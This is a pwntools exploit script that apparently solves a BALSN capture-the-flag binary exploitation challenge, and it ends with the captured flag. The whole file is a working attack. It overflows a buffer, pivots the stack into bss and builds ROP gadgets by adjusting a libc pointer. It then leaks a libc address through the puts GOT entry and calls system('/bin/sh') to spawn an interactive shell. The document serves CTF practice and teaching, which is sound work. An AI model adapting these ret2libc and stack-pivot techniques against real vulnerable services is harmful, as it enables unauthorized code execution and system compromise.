#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './chall'
context.terminal = ['tmux', 'new-window']
#context.terminal = ["tmux", "splitw", "-hb"]
argv = []
env = {}
e = ELF(exe)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = f'''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start(argv, env=env)

leave_ret = p64(0x4011c5)
pop_rbp_ret = p64(0x40115d)
#0x000000000040115c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
add_dword_ebx = p64(0x40115c)
# rbx[0:8] = rdx[8:16]
add_bl_dh = p64(0x4011c7)

# mov ebx, 0x100002e ; pop rbp ; ret
mov_ebx_pop_rbp = p64(0x0000000000401158)

gets_rbp = p64(0x4011a0)

ret = p64(0x40101a)

# pivot to bss
payload = b"A"*0x20
payload += p64(0x404000+0x600+0x300) # rbp
payload += gets_rbp # read second part into bss

io.sendline(payload)

log.info(f"pop rdi gadget at {hex(0x4043a8+0x200)}")

# call _start -> libc_start_main to push libc address onto
# bss stack
payload2 = b"A"*0x28
payload2 += p64(e.sym[b'_start'])
io.sendline(payload2)

payload3 = b"B"*0x20
payload3 += p64(0x404000+0xb00) # rbp
payload3 += gets_rbp # read third part into bss
io.sendline(payload3)

# +0x500 is just to make stack bigger since system
# needs it

payload4 = b"B"*0x28
payload4 += p64(e.plt[b'gets'])
payload4 += add_bl_dh
payload4 += pop_rbp_ret
# gadget location +0x3d due to add_dword_ebx gadget
payload4 += p64(0x4043a8+0x3d+0x500)
# add 0x55 to libc_start_main until it points
# to pop_rdi_ret
# gadget off from libc_start_main = 1445
payload4 += add_dword_ebx*17
payload4 += pop_rbp_ret
# write ropchain to leak libc after the pop_rdi_ret
# gadget we build
payload4 += p64(0x4043a8+8+0x20+0x500)
payload4 += gets_rbp
payload4 += pop_rbp_ret
payload4 += p64(0x4043a8-8+0x500)
io.sendline(payload4)

payload5 = p8(0x0)*0x10 +p32(0) + p8(1) + p8(85) + p16(0)
io.sendline(payload5)

payload6 = p64(e.got['puts'])
payload6 += p64(e.plt['puts'])
payload6 += p64(e.sym[b'_start'])
payload6 += p64(0x414141)*0x2
payload6 += pop_rbp_ret
payload6 += p64(0x4043a8-8+0x500)
payload6 += leave_ret
io.sendline(payload6)

for i in range(5):
    io.recvline()

leak = io.recvline().replace(b'\n', b'')
leak = u64(leak.ljust(8, b'\x00')) - 0x80ed0

log.info(f"Libc leak: {hex(leak)}")

libc.address = leak

payload7 = b"A"*0x28
payload7 += p64(libc.address + 0x2a3e5)
payload7 += p64(next(libc.search(b"/bin/sh\x00")))
payload7 += ret
payload7 += p64(libc.sym.system)

io.sendline(payload7)

io.interactive()

# BALSN{N0_CsU_1nIt_T0_c0ncTr0l_ArGs_1s_a1s0_V3ry_3asY:)}

# spawnix+26
# 0x403f00


